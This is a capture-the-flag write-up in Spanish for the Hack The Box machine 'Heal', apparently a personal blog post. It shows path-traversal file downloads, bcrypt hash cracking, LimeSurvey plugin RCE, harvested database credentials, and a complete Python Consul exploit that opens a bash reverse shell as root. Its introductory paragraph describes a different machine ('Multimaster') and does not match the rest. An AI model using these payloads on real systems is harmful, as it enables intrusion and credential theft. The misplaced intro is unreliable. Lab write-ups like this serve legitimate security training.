---
layout: single
title: heal - Hack The Box
excerpt: "Escaneo con dirsearch revela directorios interesantes. Se encuentra una funcionalidad Exportar como PDF vulnerable a LFI en /download?filename=..., permitiendo leer archivos internos. Se extrae un API Token desde la base de datos SQLite y se usa para autenticarse en la API. Se explota una vulnerabilidad en LimeSurvey 6.6.4 para lograr RCE. Para la escalada, se abusa de Consul API enviando un PUT a /v1/agent/service/register, registrando un servicio malicioso que ejecuta una reverse shell como root."
date: 2024-12-25
classes: wide
header:
  teaser: /assets/images/htb-writeup-heal/porta.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:
  - wfuzz
  - burp suite
  - sql
  - john
  - cve
  - escalada de privilegio
---

![](/assets/images/htb-writeup-heal/porta.png)

Multimaster was a challenging Windows machine that starts with an SQL injection so we can get a list of hashes. The box author threw a little curve ball here and it took me a while to figure that the hash type was Keccak-384, and not SHA-384. After successfully spraying the cracked password, we exploit a local command execution vulnerability in VS Code, then find a password in a DLL file, perform a targeted Kerberoasting attack and finally use our Server Operators group membership to get the flag.


## Portscan

```
   1   │ ┌──(noesholk㉿noes)-[~]
   2   │ └─$ sudo nmap -p22,80,8545 -sCV 10.10.11.46
   3   │ [sudo] contraseña para noesholk: 
   4   │ Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-10 08:43 UTC
   5   │ Nmap scan report for heal.htb (10.10.11.46)
   6   │ Host is up (0.14s latency).
   7   │ 
   8   │ PORT     STATE  SERVICE VERSION
   9   │ 22/tcp   open   ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
  10   │ | ssh-hostkey: 
  11   │ |   256 68:af:80:86:6e:61:7e:bf:0b:ea:10:52:d7:7a:94:3d (ECDSA)
  12   │ |_  256 52:f4:8d:f1:c7:85:b6:6f:c6:5f:b2:db:a6:17:68:ae (ED25519)
  13   │ 80/tcp   open   http    nginx 1.18.0 (Ubuntu)
  14   │ |_http-server-header: nginx/1.18.0 (Ubuntu)
  15   │ |_http-title: Heal
  16   │ 8545/tcp closed unknown
  17   │ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
  18   │ 
  19   │ Service detection performed. Please report any incorrect results at https://nmap.org/
       │ submit/ .
  20   │ Nmap done: 1 IP address (1 host up) scanned in 12.52 seconds
```
vemos 2 puertos archivos abiertos `22,80`

## puerto 80 web

![](/assets/images/htb-writeup-heal/healhtb.png)


nos logiamos pero no encontramos nada por ahora asi es que aremos un fuzzing o analizaremos mas profrundamente con bup suite si no encontramos nada util


![](/assets/images/htb-writeup-heal/exportaspfd.png)

encontre esto con `wfuzz`


![](/assets/images/htb-writeup-heal/apihealhtb.png)

encontre unos cve pero ninguno me funciono haci que toca seguir hacindo fuzzing y analizar la pagina con `burp suite`


![](/assets/images/htb-writeup-heal/exportaspfd.png)

despues de hacer buscarla vulnevilidad de la pgina no encontre ningun cve que autamomatirasara el proceso asi que lo aremos a burp suite y lo encotramos capturando export ass pdf

```
GET /download?filename=../../../../../config/database.yml HTTP/1.1
Host: api.heal.htb
Accept: application/json, text/plain, /
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjozfQ.CZbGMyPLgTWm9p2lPa9pGZ0vGQ0qKgr7RG4kj1tUSGc
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
Origin: http://heal.htb
Referer: http://heal.htb/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close
```

decargamos el database.yml
```
wget --header="Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjozfQ.CZbG
MyPLgTWm9p2lPa9pGZ0vGQ0qKgr7RG4kj1tUSGc" http://api.heal.htb/download?filename=../../storage/development.sqlite3 -O development.sqlite3
```

```
   1   │ ┌──(noesholk㉿noes)-[~/Documentos]
   2   │ └─$ sqlite3 development.sqlite3
   3   │ SQLite version 3.46.1 2024-08-13 09:16:08
   4   │ Enter ".help" for usage hints.
   5   │ sqlite> SELECT * FROM users
   6   │    ...> ;
   7   │ 1|ralph@heal.htb|$2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG|2024
       │ -09-27 07:49:31.614858|2024-09-27 07:49:31.614858|Administrator|ralph|1
   8   │ 2|222@333.444|$2a$12$mOKcCcvq7d6sT5JbtdAibuRkAvVzz7dfId7gAfH17FAuhLEnVQZZ.|2025-02
       │ -09 07:32:36.834334|2025-02-09 07:32:36.834334|111|555|0
   9   │ 3|noes@gmail.com|$2a$12$UJ5FijIp4ypHkZhEhzZx1en2XcaQq1LGMecScI1ZqHRHErPPeIecu|2025
       │ -02-09 07:57:43.470970|2025-02-09 07:57:43.470970|noesholk|noes|0
  10   │ sqlite>
```

```
   1   │ ┌──(noesholk㉿noes)-[~/Documentos]
   2   │ └─$ hashcat -m 3200 hash /usr/share/wordlists/rockyou.txt
   3   │ hashcat (v6.2.6) starting
   4   │ 
   5   │ OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 18.1.8, S
       │ LEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
   6   │ ==================================================================================
       │ ==========================================================
   7   │ * Device #1: cpu-haswell-AMD Athlon 3000G with Radeon Vega Graphics, 3157/6379 MB 
       │ (1024 MB allocatable), 1MCU
   8   │ 
   9   │ Minimum password length supported by kernel: 0
  10   │ Maximum password length supported by kernel: 72
  11   │ 
  12   │ Hashes: 1 digests; 1 unique digests, 1 unique salts
  13   │ Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
  14   │ Rules: 1
  15   │ 
  16   │ Optimizers applied:
  17   │ * Zero-Byte
  18   │ * Single-Hash
  19   │ * Single-Salt
  20   │ 
  21   │ Watchdog: Temperature abort trigger set to 90c
  22   │ 
  23   │ Host memory required for this attack: 0 MB
  24   │ 
  25   │ Dictionary cache hit:
  26   │ * Filename..: /usr/share/wordlists/rockyou.txt
  27   │ * Passwords.: 14344385
  28   │ * Bytes.....: 139921507
  29   │ * Keyspace..: 14344385
  30   │ 
  31   │ Cracking performance lower than expected?                 
  32   │ 
  33   │ * Append -w 3 to the commandline.
  34   │   This can cause your screen to lag.
  35   │ 
  36   │ * Append -S to the commandline.
  37   │   This has a drastic speed impact but can be better for specific attacks.
  38   │   Typical scenarios are a small wordlist but a large ruleset.
  39   │ 
  40   │ * Update your backend API runtime / driver the right way:
  41   │   https://hashcat.net/faq/wrongdriver
  42   │ 
  43   │ * Create more work items to make use of your parallelization power:
  44   │   https://hashcat.net/faq/morework
  45   │ 
  46   │ $2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG:147258369
  47   │                                                           
  48   │ Session..........: hashcat
  49   │ Status...........: Cracked
  50   │ Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
  51   │ Hash.Target......: $2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9S...GCSZnG
  52   │ Time.Started.....: Sun Feb  9 20:40:56 2025 (2 mins, 14 secs)
  53   │ Time.Estimated...: Sun Feb  9 20:43:10 2025 (0 secs)
  54   │ Kernel.Feature...: Pure Kernel
  55   │ Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
  56   │ Guess.Queue......: 1/1 (100.00%)
  57   │ Speed.#1.........:        4 H/s (8.23ms) @ Accel:1 Loops:128 Thr:1 Vec:1
  58   │ Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
  59   │ Progress.........: 482/14344385 (0.00%)
  60   │ Rejected.........: 0/482 (0.00%)
  61   │ Restore.Point....: 481/14344385 (0.00%)
  62   │ Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:3968-4096
  63   │ Candidate.Engine.: Device Generator
  64   │ Candidates.#1....: 147258369 -> 147258369
  65   │ Hardware.Mon.#1..: Util:100%
  66   │ 
  67   │ Started: Sun Feb  9 20:39:47 2025
  68   │ Stopped: Sun Feb  9 20:43:11 2025
```

## login
nos logeamos con a la pagina web



![](/assets/images/htb-writeup-heal/takesurvey1.png)


nos logeamos con la credenciales que usamos en ssh


![](/assets/images/htb-writeup-heal/takesurvey2.png)



## limesurvey

- Descripción: Un atacante autenticado puede crear un archivo ZIP que contiene un config.xml y un archivo PHP malicioso (por ejemplo, una shell inversa). Al cargar y activar este complemento a través del gestor de complementos de LimeSurvey, el atacante puede ejecutar código arbitrario en el servidor.

- Procedimiento de explotación:

- Crear un archivo config.xml y un archivo PHP malicioso (por ejemplo, revshell.php).
- Comprimir estos archivos en un archivo ZIP.
- Iniciar sesión en LimeSurvey con credenciales válidas.
- Navegar a Configuración -> Complementos -> Subir e Instalar.
- Seleccionar y cargar el archivo ZIP creado.
- Instalar y activar el complemento malicioso.
- Iniciar un listener en el atacante (por ejemplo, usando Netcat).
- Acceder a la URL del archivo PHP malicioso para obtener una shell inversa.

https://github.com/Y1LD1R1M-1337/Limesurvey-RCE

![](/assets/images/htb-writeup-heal/takesurvey3.png)

![](/assets/images/htb-writeup-heal/takesurvey4.png)

```
   1   │ www-data@heal:~/limesurvey$ cat ./application/config/* |grep "password"
   2   │ $config['defaultpass']        = 'password'; // This is the default password for the default user when LimeSurvey is ins
       │ talled
   3   │ // If the user (admins) enters password incorrectly
   4   │ // use_one_time_passwords
   5   │ // Activate One time passwords
   6   │ // a one time password which was previously written into the users table (column one_time_pw) by
   7   │ // This setting has to be turned on to enable the usage of one time passwords (default = off).
   8   │ $config['use_one_time_passwords'] = false;
   9   │ // display_user_password_in_html
  10   │ // Option to tell LS to display the automatically generated user password in the html GUI or not
  11   │ $config['display_user_password_in_html'] = false;
  12   │ // display_user_password_in_email
  13   │ // Option to tell LS to display the automatically generated user password in the welcome email or not
  14   │ $config['display_user_password_in_email'] = true;
  15   │ // * Disables changing of the admin user's details and password
  16   │ * To prevent brute force against forgotten password functionality, there is a random delay
  17   │ $config['minforgottenpasswordemaildelay'] = 500000;
  18   │ $config['maxforgottenpasswordemaildelay'] = 1500000;
  19   │ $config['passwordValidationRules'] = array(
  20   │ |    'password' The password used to connect to the database
  21   │             'password' => 'somepassword',
  22   │ |   'password' The password used to connect to the database
  23   │             'password' => 'root',
  24   │ |    'password' The password used to connect to the database
  25   │             'connectionString' => 'pgsql:host=localhost;port=5432;user=postgres;password=somepassword;dbname=limesurvey
       │ ;',
  26   │             'password' => 'somepassword',
  27   │ |    'password' The password used to connect to the database
  28   │             'password' => 'somepassword',
  29   │ |    'password' The password used to connect to the database
  30   │                         'connectionString' => 'pgsql:host=localhost;port=5432;user=db_user;password=AdmiDi0_pA$$w0rd;db
       │ name=survey;',
  31   │                         'password' => 'AdmiDi0_pA$$w0rd',
  32   │ $config['emailsmtpuser']      = ''; // SMTP authorisation username - only set this if your server requires authorizatio
       │ n - if you set it you HAVE to set a password too
  33   │ $config['emailsmtppassword']  = ''; // SMTP authorisation password - empty password is not allowed
  34   │             'password'=>'YOURPASSWORD',
  35   │                     'ETwigViewRendererStaticClassProxy' =>  array("encode", "textfield", "form", "link", "emailField", 
       │ "begiton", "passwordfield", "hiddenfield", "textArea", "checkBox", "tag"),
```



## ssh

- `name` ron
- `password` AdmiDi0_pA$$w0rd

ya tenemos acceso a una consolo interactiva con ron depues de l oque mostre mas atras
ahora a escar privilegios


```
ron@heal:/$ netstat -lt
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State 
tcp        0      0 localhost:postgresql    0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:ssh             0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:http            0.0.0.0:*               LISTEN
tcp        0      0 localhost:domain        0.0.0.0:*               LISTEN
tcp        0      0 localhost:3001          0.0.0.0:*               LISTEN
tcp        0      0 localhost:3000          0.0.0.0:*               LISTEN
tcp        0      0 localhost:8302          0.0.0.0:*               LISTEN
tcp        0      0 localhost:8301          0.0.0.0:*               LISTEN
tcp        0      0 localhost:8300          0.0.0.0:*               LISTEN
tcp        0      0 localhost:8503          0.0.0.0:*               LISTEN
tcp        0      0 localhost:8500          0.0.0.0:*               LISTEN
tcp        0      0 localhost:8600          0.0.0.0:*               LISTEN
tcp6       0      0 [::]:ssh                [::]:*                  LISTEN
```

vemos unos puertos abiertos asi que toca un port forwarding


```
   1   │ ┌──(noesholk㉿noes)-[~]
   2   │ └─$ ssh -L 8500:localhost:8500 ron@10.10.11.46
   3   │ ron@10.10.11.46's password: 
   4   │ Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-126-generic x86_64)
   5   │ 
   6   │  * Documentation:  https://help.ubuntu.com
   7   │  * Management:     https://landscape.canonical.com
   8   │  * Support:        https://ubuntu.com/pro
   9   │ 
  10   │  System information as of Tue Feb 11 07:20:26 AM UTC 2025
  11   │ 
  12   │   System load:           0.06
  13   │   Usage of /:            82.6% of 7.71GB
  14   │   Memory usage:          30%
  15   │   Swap usage:            0%
  16   │   Processes:             258
  17   │   Users logged in:       0
  18   │   IPv4 address for eth0: 10.10.11.46
  19   │   IPv6 address for eth0: dead:beef::250:56ff:feb0:2757
  20   │ 
  21   │ 
  22   │ Expanded Security Maintenance for Applications is not enabled.
  23   │ 
  24   │ 29 updates can be applied immediately.
  25   │ 18 of these updates are standard security updates.
  26   │ To see these additional updates run: apt list --upgradable
  27   │ 
  28   │ Enable ESM Apps to receive additional future security updates.
  29   │ See https://ubuntu.com/esm or run: sudo pro status
  30   │ 
  31   │ 
  32   │ The list of available updates is more than a week old.
  33   │ To check for new updates run: sudo apt update
  34   │ Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your In
       │ ternet connection or proxy settings
  35   │ 
  36   │ 
  37   │ Last login: Tue Feb 11 07:20:27 2025 from 10.10.14.204
```


![](/assets/images/htb-writeup-heal/consulv119.png)

```
   1   │ import requests, sys
   2   │ 
   3   │ 
   4   │ 
   5   │ if len(sys.argv) < 5:
   6   │ 
   7   │    print(f"\n[\033[1;31m-\033[1;37m] Usage: python3 {sys.argv[0]} <rhost> <rport> <lhost> <lport>\n")
   8   │ 
   9   │    exit(1)
  10   │ 
  11   │ 
  12   │ 
  13   │ target = f"http://{sys.argv[1]}:{sys.argv[2]}/v1/agent/service/register"
  14   │ 
  15   │ json = {"Address": "127.0.0.1", "check": {"Args": ["/bin/bash", "-c", f"bash -i >& /dev/tcp/{sys.argv[3]}/{sys.argv[4]}
       │  0>&1"], "interval": "10s", "Timeout": "864000s"}, "ID": "gato", "Name": "gato", "Port": 80}
  16   │ 
  17   │ 
  18   │ 
  19   │ try:
  20   │ 
  21   │    requests.put(target, json=json)
  22   │ 
  23   │    print("\n[\033[1;32m+\033[1;37m] Request sent successfully, check your listener\n")
  24   │ 
  25   │ except:
  26   │ 
  27   │    print("\n[\033[1;31m-\033[1;37m] Something went wrong, check the connection and try again\n")
```

python3 exploit2.py 127.0.0.1 8500 10.10.14.204 8080




```
   1   │ ┌──(noesholk㉿noes)-[~/Documentos]
   2   │ └─$ nc -lvnp 8080                  
   3   │ listening on [any] 8080 ...
   4   │ connect to [10.10.14.204] from (UNKNOWN) [10.10.11.46] 37800
   5   │ bash: cannot set terminal process group (70264): Inappropriate ioctl for device
   6   │ bash: no job control in this shell
   7   │ root@heal:/# ls
   8   │ ls
   9   │ bin
  10   │ boot
  11   │ cdrom
  12   │ dev
  13   │ etc
  14   │ home
  15   │ lib
  16   │ lib32
  17   │ lib64
  18   │ libx32
  19   │ lost+found
  20   │ media
  21   │ mnt
  22   │ opt
  23   │ proc
  24   │ root
  25   │ run
  26   │ sbin
  27   │ srv
  28   │ sys
  29   │ tmp
  30   │ usr
  31   │ var
  32   │ root@heal:/# ls
  33   │ ls
  34   │ bin
  35   │ boot
  36   │ cdrom
  37   │ dev
  38   │ etc
  39   │ home
  40   │ lib
  41   │ lib32
  42   │ lib64
  43   │ libx32
  44   │ lost+found
  45   │ media
  46   │ mnt
  47   │ opt
  48   │ proc
  49   │ root
  50   │ run
  51   │ sbin
  52   │ srv
  53   │ sys
  54   │ tmp
  55   │ usr
  56   │ var
  57   │ root@heal:/# cd root        
  58   │ cd root
  59   │ root@heal:~# ls
  60   │ ls
  61   │ cleanup-consul.sh
  62   │ consul-up.sh
  63   │ plugin_cleanup.sh
  64   │ root.txt
  65   │ root@heal:~# ^Z
  66   │ zsh: suspended  nc -lvnp 8080
```
